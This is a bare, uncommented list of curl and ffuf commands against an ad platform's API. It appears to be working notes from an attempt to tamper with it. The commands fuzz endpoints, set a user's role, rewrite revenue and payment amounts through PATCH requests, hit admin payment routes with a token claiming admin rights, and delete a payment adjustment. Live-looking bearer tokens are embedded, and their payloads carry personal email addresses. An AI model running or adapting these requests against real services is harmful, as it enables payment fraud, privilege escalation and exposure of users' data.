curl -X PATCH "https://api.cifraads.com/users/361" \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImxldHR2aTIwMTVAZ21haWwuY29tIiwic3ViIjozNjEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ2NzAyODU4LCJleHAiOjE3NDY3MDY0NTh9.GT1-oX5kH6W332Oks0CAIYcmbIERyb0atJSo0f0I9LE' \
  -H "Content-Type: application/json" \
  -d '{"role": "user"}' 

ffuf -u https://api.cifraads.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,201,202,204,401,403 -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImxldHR2aTIwMTVAZ21haWwuY29tIiwic3ViIjozNjEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ2NjQxMDg5LCJleHAiOjE3NDY2NDQ2ODl9.WC6rHhBA07GI_6WjNne5BBYLIaOoOabo9pZLg7C8A2g' \

ffuf -X PATCH \
  -w ~/adjust-words-ultimate.txt \
  -u https://api.cifraads.com/FUZZ \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImxldHR2aTIwMTVAZ21haWwuY29tIiwic3ViIjozNjEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ2NjQxMDg5LCJleHAiOjE3NDY2NDQ2ODl9.WC6rHhBA07GI_6WjNne5BBYLIaOoOabo9pZLg7C8A2g' \
  -H "Content-Type: application/json" \
  -d '{"cf_ads": 291, "start_date": "2025-04-30", "end_date": "2025-05-07", "adRevenue": 4000.00}' \
  -mc 200,201,202,204,401,403 \
  -fc 404 \
  -t 10 \
  -o patch-adjust-search-ultimate.json \
  -of json



ffuf -X PATCH -w ./adjust-words.txt -u https://api.cifraads.com/FUZZ -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImxldHR2aTIwMTVAZ21haWwuY29tIiwic3ViIjozNjEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ2NjQxMDg5LCJleHAiOjE3NDY2NDQ2ODl9.WC6rHhBA07GI_6WjNne5BBYLIaOoOabo9pZLg7C8A2g" -H "Content-Type: application/json" -d '{"cf_ads": 291, "start_date": "2025-04-30", "end_date": "2025-05-07", "adRevenue": 4000.00}' -mc 200,201,202,204,401,403 -fc 404 -t 10 -o patch-adjust-search.json -of json


ffuf -X PATCH \
  -w ~/adjust-words-ultimate.txt \
  -u https://api.cifraads.com/FUZZ \
  -H "Authorization: Bearer SEU_TOKEN_COMPLETO_AQUI" \
  -H "Content-Type: application/json" \
  -d '{"cf_ads": 291, "start_date": "2025-04-30", "end_date": "2025-05-07", "adRevenue": 4000.00}' \
  -mc 200,201,202,204,401,403 \
  -fc 404 \
  -t 10 \
  -o patch-adjust-search-ultimate.json \
  -of json


curl -X PATCH "https://api.cifraads.com/daily-treatments/daily-treatment-report" \
 -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImxldHR2aTIwMTVAZ21haWwuY29tIiwic3ViIjozNjEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ2NjQxMDg5LCJleHAiOjE3NDY2NDQ2ODl9.WC6rHhBA07GI_6WjNne5BBYLIaOoOabo9pZLg7C8A2g' \
 -H "Content-Type: application/json" \
  -d '{
        "cf_ads": 291,
        "start_date": "2025-04-30",
        "end_date": "2025-05-07",
        "adRevenue": 120.289
      }'


  curl -X PATCH https://api.cifraads.com/payments/359 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImV4eHRyZW1lbHBnQGdtYWlsLmNvbSIsInN1YiI6MzU3LCJyb2xlIjoidXNlciIsImlhdCI6MTc0NjEwMjE1OSwiZXhwIjoxNzQ2MTA1NzU5fQ.3y5T-kw5pBWbk0oopwBwzF-EfHb-NiVCt0kUN5YyveM" \
  -H "Content-Type: application/json" \
  -d '{
        "totalAmount": "2798.62",
        "publisherRevenue": "2798.62",
        "affiliateRevenue": "0.00"
      }'


curl -X PATCH 'https://api.cifraads.com/admin/payments/359' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImxldHR2aTIwMTVAZ21haWwuY29tIiwic3ViIjozNjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0NjEwMjUwOSwiZXhwIjoxNzQ2MTA2MTA5fQ.WEBm_eBzO6booCwZCxhn3X5zSkR7RJZFfWoacJS-5hc' \
  -H 'Content-Type: application/json' \
  -d '{
        "totalAmount": "2798.62",
        "publisherRevenue": "2798.62",
        "affiliateRevenue": "0.00"
      }'


curl -X DELETE 'https://api.cifraads.com/payments/adjust/18' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImxldHR2aTIwMTVAZ21haWwuY29tIiwic3ViIjozNjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0NjEwMjUwOSwiZXhwIjoxNzQ2MTA2MTA5fQ.WEBm_eBzO6booCwZCxhn3X5zSkR7RJZFfWoacJS-5hc'
